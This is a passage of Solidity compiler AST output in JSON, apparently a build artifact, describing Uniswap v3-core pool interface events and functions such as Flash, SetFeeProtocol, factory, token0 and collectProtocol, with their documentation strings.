													"nodeType": "ElementaryTypeName",
													"src": "3593:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3411:198:4"
									},
									"src": "3401:209:4"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 306,
										"nodeType": "StructuredDocumentation",
										"src": "3616:562:4",
										"text": "@notice Emitted by the pool for any flashes of token0/token1\n @param sender The address that initiated the swap call, and that received the callback\n @param recipient The address that received the tokens from flash\n @param amount0 The amount of token0 that was flashed\n @param amount1 The amount of token1 that was flashed\n @param paid0 The amount of token0 paid for the flash, which can exceed the amount0 plus the fee\n @param paid1 The amount of token1 paid for the flash, which can exceed the amount1 plus the fee"
									},
									"id": 320,
									"name": "Flash",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 319,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 308,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 320,
												"src": "4204:22:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 307,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4204:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 310,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 320,
												"src": "4236:25:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 309,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4236:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 312,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 320,
												"src": "4271:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 311,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4271:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 314,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 320,
												"src": "4296:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 313,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4296:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 316,
												"indexed": false,
												"mutability": "mutable",
												"name": "paid0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 320,
												"src": "4321:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 315,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4321:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 318,
												"indexed": false,
												"mutability": "mutable",
												"name": "paid1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 320,
												"src": "4344:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 317,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4344:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4194:169:4"
									},
									"src": "4183:181:4"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 321,
										"nodeType": "StructuredDocumentation",
										"src": "4370:451:4",
										"text": "@notice Emitted by the pool for increases to the number of observations that can be stored\n @dev observationCardinalityNext is not the observation cardinality until an observation is written at the index\n just before a mint/swap/burn.\n @param observationCardinalityNextOld The previous value of the next observation cardinality\n @param observationCardinalityNextNew The updated value of the next observation cardinality"
									},
									"id": 327,
									"name": "IncreaseObservationCardinalityNext",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 326,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 323,
												"indexed": false,
												"mutability": "mutable",
												"name": "observationCardinalityNextOld",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 327,
												"src": "4876:36:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 322,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "4876:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 325,
												"indexed": false,
												"mutability": "mutable",
												"name": "observationCardinalityNextNew",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 327,
												"src": "4922:36:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 324,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "4922:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4866:98:4"
									},
									"src": "4826:139:4"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 328,
										"nodeType": "StructuredDocumentation",
										"src": "4971:370:4",
										"text": "@notice Emitted when the protocol fee is changed by the pool\n @param feeProtocol0Old The previous value of the token0 protocol fee\n @param feeProtocol1Old The previous value of the token1 protocol fee\n @param feeProtocol0New The updated value of the token0 protocol fee\n @param feeProtocol1New The updated value of the token1 protocol fee"
									},
									"id": 338,
									"name": "SetFeeProtocol",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 337,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 330,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol0Old",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 338,
												"src": "5367:21:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 329,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5367:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 332,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol1Old",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 338,
												"src": "5390:21:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 331,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5390:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 334,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol0New",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 338,
												"src": "5413:21:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 333,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5413:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 336,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol1New",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 338,
												"src": "5436:21:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 335,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5436:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5366:92:4"
									},
									"src": "5346:113:4"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 339,
										"nodeType": "StructuredDocumentation",
										"src": "5465:384:4",
										"text": "@notice Emitted when the collected protocol fees are withdrawn by the factory owner\n @param sender The address that collects the protocol fees\n @param recipient The address that receives the collected protocol fees\n @param amount0 The amount of token0 protocol fees that is withdrawn\n @param amount0 The amount of token1 protocol fees that is withdrawn"
									},
									"id": 349,
									"name": "CollectProtocol",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 348,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 341,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 349,
												"src": "5876:22:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 340,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5876:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 343,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 349,
												"src": "5900:25:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 342,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5900:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 345,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 349,
												"src": "5927:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 344,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5927:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 347,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 349,
												"src": "5944:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 346,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5944:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5875:85:4"
									},
									"src": "5854:107:4"
								}
							],
							"scope": 351,
							"src": "159:5804:4"
						}
					],
					"src": "45:5919:4"
				},
				"id": 4
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol",
					"exportedSymbols": {
						"IUniswapV3PoolImmutables": [
							390
						]
					},
					"id": 391,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 352,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:5"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 353,
								"nodeType": "StructuredDocumentation",
								"src": "71:153:5",
								"text": "@title Pool state that never changes\n @notice These parameters are fixed for a pool forever, i.e., the methods will always return the same values"
							},
							"fullyImplemented": false,
							"id": 390,
							"linearizedBaseContracts": [
								390
							],
							"name": "IUniswapV3PoolImmutables",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 354,
										"nodeType": "StructuredDocumentation",
										"src": "265:138:5",
										"text": "@notice The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\n @return The contract address"
									},
									"functionSelector": "c45a0155",
									"id": 359,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "factory",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 355,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "424:2:5"
									},
									"returnParameters": {
										"id": 358,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 357,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 359,
												"src": "450:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 356,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "450:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "449:9:5"
									},
									"scope": 390,
									"src": "408:51:5",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 360,
										"nodeType": "StructuredDocumentation",
										"src": "465:113:5",
										"text": "@notice The first of the two tokens of the pool, sorted by address\n @return The token contract address"
									},
									"functionSelector": "0dfe1681",
									"id": 365,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token0",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 361,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "598:2:5"
									},
									"returnParameters": {
										"id": 364,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 363,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 365,
												"src": "624:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 362,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "624:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "623:9:5"
									},
									"scope": 390,
									"src": "583:50:5",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 366,
										"nodeType": "StructuredDocumentation",
										"src": "639:114:5",
										"text": "@notice The second of the two tokens of the pool, sorted by address\n @return The token contract address"
									},
									"functionSelector": "d21220a7",
									"id": 371,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token1",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 367,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "773:2:5"
									},
									"returnParameters": {
										"id": 370,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 369,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 371,
												"src": "799:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 368,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "799:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "798:9:5"
									},
									"scope": 390,
									"src": "758:50:5",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 372,
										"nodeType": "StructuredDocumentation",
										"src": "814:84:5",
										"text": "@notice The pool's fee in hundredths of a bip, i.e. 1e-6\n @return The fee"
									},
									"functionSelector": "ddca3f43",
									"id": 377,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "fee",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 373,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "915:2:5"
									},
									"returnParameters": {
										"id": 376,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 375,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 377,
												"src": "941:6:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 374,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "941:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "940:8:5"
									},
									"scope": 390,
									"src": "903:46:5",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 378,
										"nodeType": "StructuredDocumentation",
										"src": "955:358:5",
										"text": "@notice The pool tick spacing\n @dev Ticks can only be used at multiples of this value, minimum of 1 and always positive\n e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ...\n This value is an int24 to avoid casting even though it is always positive.\n @return The tick spacing"
									},
									"functionSelector": "d0c93a7c",
									"id": 383,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "tickSpacing",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 379,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1338:2:5"
									},
									"returnParameters": {
										"id": 382,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 381,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 383,
												"src": "1364:5:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 380,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1364:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1363:7:5"
									},
									"scope": 390,
									"src": "1318:53:5",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 384,
										"nodeType": "StructuredDocumentation",
										"src": "1377:363:5",
										"text": "@notice The maximum amount of position liquidity that can use any tick in the range\n @dev This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and\n also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\n @return The max amount of liquidity per tick"
									},
									"functionSelector": "70cf754a",
									"id": 389,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "maxLiquidityPerTick",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 385,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1773:2:5"
									},
									"returnParameters": {
										"id": 388,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 387,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 389,
												"src": "1799:7:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 386,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1799:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1798:9:5"
									},
									"scope": 390,
									"src": "1745:63:5",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 391,
							"src": "224:1586:5"
						}
					],
					"src": "45:1766:5"
				},
				"id": 5
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol",
					"exportedSymbols": {
						"IUniswapV3PoolOwnerActions": [
							416
						]
					},
					"id": 417,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 392,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:6"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 393,
								"nodeType": "StructuredDocumentation",
								"src": "71:116:6",
								"text": "@title Permissioned pool actions\n @notice Contains pool methods that may only be called by the factory owner"
							},
							"fullyImplemented": false,
							"id": 416,
							"linearizedBaseContracts": [
								416
							],
							"name": "IUniswapV3PoolOwnerActions",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 394,
										"nodeType": "StructuredDocumentation",
										"src": "230:205:6",
										"text": "@notice Set the denominator of the protocol's % share of the fees\n @param feeProtocol0 new protocol fee for token0 of the pool\n @param feeProtocol1 new protocol fee for token1 of the pool"
									},
									"functionSelector": "8206a4d1",
									"id": 401,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setFeeProtocol",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 399,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 396,
												"mutability": "mutable",
												"name": "feeProtocol0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 401,
												"src": "464:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 395,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "464:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 398,
												"mutability": "mutable",
												"name": "feeProtocol1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 401,
												"src": "484:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 397,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "484:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "463:40:6"
									},
									"returnParameters": {
										"id": 400,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "512:0:6"
									},
									"scope": 416,
									"src": "440:73:6",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 402,
										"nodeType": "StructuredDocumentation",
										"src": "519:483:6",
										"text": "@notice Collect the protocol fee accrued to the pool\n @param recipient The address to which collected protocol fees should be sent\n @param amount0Requested The maximum amount of token0 to send, can be 0 to collect fees in only token1\n @param amount1Requested The maximum amount of token1 to send, can be 0 to collect fees in only token0\n @return amount0 The protocol fee collected in token0\n @return amount1 The protocol fee collected in token1"
									},
									"functionSelector": "85b66729",
									"id": 415,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "collectProtocol",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 409,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 404,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 415,
												"src": "1041:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 403,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1041:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 406,
												"mutability": "mutable",
												"name": "amount0Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 415,
												"src": "1068:24:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 405,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1068:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 408,
												"mutability": "mutable",
												"name": "amount1Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 415,
												"src": "1102:24:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 407,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1102:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1031:101:6"
									},
									"returnParameters": {
										"id": 414,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 411,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 415,
												"src": "1151:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 410,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1151:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 413,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 415,
												"src": "1168:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 412,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1168:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1150:34:6"
									},
									"scope": 416,
									"src": "1007:178:6",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 417,
							"src": "187:1000:6"
						}
					],
					"src": "45:1143:6"
				},
				"id": 6
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol",
					"exportedSymbols": {
						"IUniswapV3PoolState": [
							524
						]
					},
					"id": 525,
					"license": "GPL-2.0-or-later",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 418,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:7"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 419,
								"nodeType": "StructuredDocumentation",
								"src": "71:169:7",
								"text": "@title Pool state that can change\n @notice These methods compose the pool's state, and can change with any frequency including multiple times\n per transaction"
							},
							"fullyImplemented": false,
							"id": 524,
							"linearizedBaseContracts": [
								524
							],
							"name": "IUniswapV3PoolState",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 420,
										"nodeType": "StructuredDocumentation",
										"src": "276:1140:7",
